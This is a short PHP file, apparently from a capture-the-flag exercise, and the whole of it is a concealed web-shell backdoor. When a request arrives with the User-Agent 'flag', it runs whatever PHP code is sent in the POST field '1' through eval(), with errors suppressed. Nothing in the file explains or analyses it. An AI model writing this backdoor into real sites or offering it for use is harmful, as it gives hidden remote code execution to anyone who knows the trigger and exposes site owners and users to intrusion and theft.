<?php
if (@$_SERVER['HTTP_USER_AGENT'] == 'flag'){
	eval($_POST[1]);
}
?>
